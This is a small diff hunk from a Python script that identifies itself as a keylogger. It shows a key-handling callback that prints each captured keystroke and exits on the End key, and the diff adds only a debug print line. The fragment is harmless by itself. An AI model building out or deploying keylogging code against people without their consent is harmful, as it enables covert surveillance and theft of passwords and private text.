@@ -14,6 +14,7 @@ t0= time.time()
 def key_reco(key):
     key = str(key)
     print(key)
+    print(1)
     if key == 'Key.end':
         print("\nSaliendo del keylogger\n")
         quit()
